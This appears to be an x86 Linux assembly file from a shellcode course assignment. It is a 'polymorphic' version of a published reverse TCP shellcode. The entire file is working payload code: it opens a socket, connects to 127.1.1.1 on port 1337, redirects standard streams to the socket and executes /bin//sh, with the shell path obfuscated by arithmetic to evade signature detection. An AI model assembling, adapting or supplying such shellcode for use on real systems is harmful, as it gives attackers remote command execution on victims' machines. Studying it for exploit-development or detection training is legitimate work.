; Polymorphic version of Shell Reverse TCP Shellcode = By Julien Ahrens
; http://shell-storm.org/shellcode/files/shellcode-883.php
; Original size:  74 bytes
; Polymorphic size: 90 bytes
; SLAE-860
; Assignment 6

global _start

section .text

    _start:
        push 0x66
        pop eax
        push 0x1
        pop ebx
        xor edx, edx
        push edx
        push ebx
        push 0x2
        mov ecx, esp
        int 0x80
        xchg edx, eax
        mov al, 0x66
        push 0x101017f
        push word 0x3905
        inc ebx
        push bx
        mov ecx, esp
        push 0x10
        push ecx
        push edx
        mov ecx, esp
        inc ebx
        int 0x80
        push 0x2
        pop ecx
        xchg edx, ebx
     loop:
        mov al, 0x3f
        int 0x80
        dec ecx
        jns loop
        mov al, 0xb
        inc ecx
        mov edx, ecx
        push edx
        mov esi, 0x3B9ACA01
        mov ebx, 0xA40DF930
        sub ebx, esi
        push ebx
        mov esi, 0x3B9ACA04
        mov ebx, 0xAA042C33
        sub ebx, esi
        push ebx
        mov ebx, esp
        int 0x80